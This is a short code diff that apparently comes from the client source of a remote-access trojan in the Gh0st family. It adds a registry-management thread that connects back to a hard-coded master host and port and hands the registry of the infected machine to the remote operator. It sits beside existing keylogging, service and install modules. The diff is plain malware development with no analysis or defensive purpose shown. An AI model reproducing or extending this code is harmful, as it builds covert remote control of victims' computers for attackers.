@@ -9,6 +9,7 @@
 #include "SystemManager.h"
 #include "KeyboardManager.h"
 #include "ServerManager.h"
+#include "RegManager.h"
 #include "..\StrCry.h"
 #include "until.h"
 #include "install.h"
@@ -322,10 +323,10 @@ void SetHostID(LPCTSTR lpServiceName, LPCTSTR lpHostID)
 }
 
 
-//服务管理线程
+// 服务管理线程
 DWORD WINAPI Loop_ServicesManager(SOCKET sRemote)
 {
-	OutputDebugString("DWORD WINAPI Loop_ServicesManager(SOCKET sRemote)");
+	//OutputDebugString("DWORD WINAPI Loop_ServicesManager(SOCKET sRemote)");
 	CClientSocket	socketClient;
 	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
 		return -1;
@@ -336,6 +337,21 @@ DWORD WINAPI Loop_ServicesManager(SOCKET sRemote)
 
 	return 0;
 }
+
+// 注册表管理
+DWORD WINAPI Loop_RegeditManager(SOCKET sRemote)
+{
+	CClientSocket	socketClient;
+	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
+		return -1;
+
+	CRegManager	manager(&socketClient);
+
+	socketClient.run_event_loop();
+
+	return 0;
+}
+
 
 
 #endif // !defined(AFX_LOOP_H_INCLUDED)
